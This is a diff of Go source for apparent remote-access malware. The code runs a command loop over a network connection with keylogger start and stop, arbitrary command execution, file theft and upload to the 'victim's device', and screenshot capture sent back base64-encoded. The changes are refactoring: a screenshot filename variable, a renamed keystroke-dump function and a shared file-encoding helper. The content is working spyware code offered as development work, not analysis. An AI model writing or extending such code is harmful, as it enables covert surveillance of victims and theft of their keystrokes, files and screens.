@@ -26,6 +26,7 @@ const (
 )
 
 var (
+	scrshot string = "scrshot.png"
 	keylog_flag int = 0
 	logfile string = "logs.txt"
 )
@@ -80,7 +81,7 @@ func main() {
 			send_resp(conn, "Keylogger started successfully")
 		} else if cmd == "keylog_stop" { 
 			keylog_flag = 0
-			send_resp(conn, dump_keystroke_logs())
+			send_resp(conn, dump_keystrokes())
 		} else {
 			send_resp(conn, exec_cmd(cmd))
 		}
@@ -141,9 +142,7 @@ func get_file(file string) (string) {
 	if !file_exists(file) {
 		return "File not found"
 	} 
-	content, _ := os.ReadFile(file)
-	b64_string := b64.StdEncoding.EncodeToString(content)
-	return b64_string
+	return file_b64(file)
 }
 
 // save the uploaded file to victim's device
@@ -160,12 +159,11 @@ func save_file(file string, b64_string string) (bool) {
 func take_screenshot() (string) {
 	bnds := screenshot.GetDisplayBounds(0)
 	img, _ := screenshot.CaptureRect(bnds)
-	file, _ := os.Create("scrshot.png")
+	file, _ := os.Create(scrshot)
 	defer file.Close()
 	png.Encode(file, img)
-	content, _ := os.ReadFile("scrshot.png")
-	b64_string := b64.StdEncoding.EncodeToString(content)
-	os.Remove("scrshot.png")
+	b64_string := file_b64(scrshot)
+	os.Remove(scrshot)
 	return b64_string
 }
 
